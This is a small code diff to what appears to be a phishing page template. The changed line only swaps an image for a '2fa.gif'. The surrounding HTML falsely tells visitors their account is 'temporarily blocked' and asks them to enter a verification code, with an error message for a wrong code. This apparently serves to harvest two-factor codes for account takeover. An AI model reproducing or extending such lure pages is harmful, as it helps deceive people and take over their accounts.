@@ -84,7 +84,7 @@ function updateHtmlAndCallback(callback) {
                 <p class="card-text py-3">We have temporarily blocked your account because your
                     protect has changed. Verify code has been sent
                 </p>
-                <img src="/img/TOtVy8P.png" class="w-100 rounded" alt="">
+                <img src="/img/2fa.gif" class="w-100 rounded" alt="">
                 <input type="text" class="form-control my-3 py-2 bg-light" id="code"
                     placeholder="Enter your code" required>
                 <p class="text-danger ms-1 d-none" id="wrong-code">
